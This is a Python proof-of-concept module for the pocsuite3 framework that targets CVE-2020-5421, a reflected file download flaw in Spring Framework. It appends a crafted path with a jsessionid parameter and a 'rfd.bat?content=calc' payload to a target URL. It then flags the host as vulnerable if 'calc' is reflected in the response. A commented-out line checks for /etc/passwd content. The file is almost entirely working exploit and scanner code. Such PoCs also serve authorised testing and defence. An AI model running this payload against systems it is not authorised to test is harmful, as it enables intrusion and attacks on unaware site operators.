#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
from pocsuite3.api import POCBase, Output
from pocsuite3.api import register_poc
import requests

headers = {'user-agent': 'ceshi/0.0.1','content-type': 'text/xml',}
poc_str = '''spring/;jsessionid=/rfd.bat?content=calc'''

def poc(url):
    if not url.startswith("http"):
            url = "http://" + url
    if "/" in url:
            url += poc_str
    try:
        res = requests.get(url, verify=False, timeout=5, headers=headers)
        response = res.text
    except Exception:
        response = ""
    return response

class TestPOC(POCBase):
    name = 'SpringFramework_CVE-2020-5421'
    vulID = 'CVE-2020-5421'  # https://xz.aliyun.com/t/8341
    author = ['debug']
    vulType = '反射性文件下载漏洞' 
    version = '1.0'    # default version: 1.0
    references = ['https://xz.aliyun.com/t/8341']
    desc = '''
                CVE-2020-5421是针对CVE-2015-5211修复方式的一个绕过，绕过方式是通过一个jsessionid路径参数
		   '''
    vulDate = '2020-11-23'
    createDate = '2020-11-23'
    updateDate = '2020-11-23'
    appName = 'Spring Framework'
    appVersion = '5.2.0 - 5.2.8, 5.1.0 - 5.1.17, 5.0.0 - 5.0.18, 4.3.0 - 4.3.28'
    appPowerLink = ''
    samples = ['']
    
    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result={}
        response = poc(self.url)
        # if 'root:x:0:0:root:/root:/bin/bash' in response:
        if 'calc' in response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url+ 'SpringFramework_CVE-2020-5421' + ' is exist!'
        return self.parse_output(result)
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output
register_poc(TestPOC)
